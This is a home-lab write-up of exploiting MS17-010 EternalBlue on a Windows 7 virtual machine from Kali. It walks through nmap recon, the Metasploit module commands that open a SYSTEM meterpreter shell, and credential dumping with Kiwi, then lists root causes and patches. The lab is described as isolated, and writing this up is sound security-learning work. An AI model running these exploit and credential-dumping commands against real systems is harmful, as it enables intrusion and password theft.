# MS17-010 EternalBlue — Windows 7 Home Lab

Home lab. Kali attacker VM vs Windows 7 target VM. Both VirtualBox, same host-only network. Goal: recon target, find vuln, get shell.

## Lab Setup

| Machine | Role | OS |
|---|---|---|
| Kali | Attacker | Kali Linux (rolling) |
| Windows7 | Target | Windows 7 Home Basic, Build 7600 |

Both VMs running in VirtualBox, networked together.

## 1. Recon — nmap

Full TCP scan, service/version detect, default scripts, OS detect:

```bash
nmap <target-ip> -sV -sC -O
```

Result:

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Home Basic 7600 microsoft-ds (workgroup: WORKGROUP)
49152-49158/tcp open msrpc   Microsoft Windows RPC
```

OS detect confirms Windows 7 / Server 2008 R2 / Vista family. Host script output flags the real problem:

```
smb2-security-mode: 2.1: Message signing enabled but not required
smb-security-mode:
  account_used: guest
  authentication_level: user
  challenge_response: supported
  message_signing: disabled (dangerous, but default)
```

SMB signing off, guest access allowed, port 445 open. Classic EternalBlue setup.

## 2. Find the exploit

```bash
searchsploit eternalblue
```

```
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)          windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB RCE (MS17-010)        windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010) windows_x86-64/remote/42030.py
```

Confirmed target's unpatched. Went with the Metasploit module instead of the raw script — cleaner payload handling.

```bash
msfconsole
search eternalblue
```

```
0  exploit/windows/smb/ms17_010_eternalblue   2017-03-14  average  Yes  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   \_ target: Windows 7
```

## 3. Exploit

```
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts <target-ip>
rhosts => <target-ip>
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

Module fires, kernel pool corruption lands, session opens.

## 4. Post-exploitation

### System info

```
meterpreter > sysinfo
Computer        : WINDOWS7
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

Full SYSTEM-level meterpreter shell, x64 payload matched target arch correctly.

### Credential harvest

Loaded Kiwi to dump cached creds:

```
meterpreter > load kiwi
Loading extension kiwi...
  [*] Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving credentials...
```

Dumped plaintext passwords from memory + SAM hash cache. SYSTEM privs = unrestricted access to credential manager, LSA secrets, cached logons.

## Root Cause

- MS17-010 unpatched (Build 7600 = RTM, no updates applied)
- SMB message signing not enforced
- Guest SMB access allowed
- Port 445 exposed on the network

## Fixes (if this were real)

- Patch to MS17-010 (KB4012212 / KB4012215)
- Enforce SMB signing
- Disable guest access on SMB
- Firewall off 445 from untrusted networks
- Windows 7 is EOL anyway — upgrade path is the real fix

## Notes

Isolated VirtualBox host-only network, no internet-facing exposure, both VMs owned by me. Lab only.
